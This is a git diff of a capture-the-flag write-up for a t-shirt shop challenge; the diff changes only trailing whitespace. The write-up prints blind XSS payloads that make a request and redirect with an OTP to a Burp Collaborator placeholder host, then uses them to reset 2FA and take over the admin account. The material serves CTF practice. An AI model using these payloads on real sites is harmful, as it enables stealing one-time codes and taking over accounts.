@@ -2,7 +2,7 @@
 > We all love our hacker t-shirts. Make your own custom ones.
 
 Application vulnerable to blind xss on feedback, Logic bugs on Change password (doesnot require old password). Only require 2FA can be reset easily.
-First, reset 2FA with this payload: 
+First, reset 2FA with this payload:  
 ```html
 "><script>
     xhr = new XMLHttpRequest();
@@ -11,7 +11,7 @@ First, reset 2FA with this payload:
     document.location='https://<burp_collaborator>/?otp='+xhr.response;
 </script>
 ```
-Second: add authenticator token and get OTP to send reset password request. 
+Second: add authenticator token and get OTP to send reset password request.  
 ```html
 "><script>
     xhr = new XMLHttpRequest();
@@ -22,4 +22,4 @@ Second: add authenticator token and get OTP to send reset password request.
 </script>
 ```
 
-Login to with `admin/1` and get flag: ![Alt text](flag.png?raw=true "Title")
+Login to with `admin/1` and get flag: ![Alt text](flag.png?raw=true "Title")  
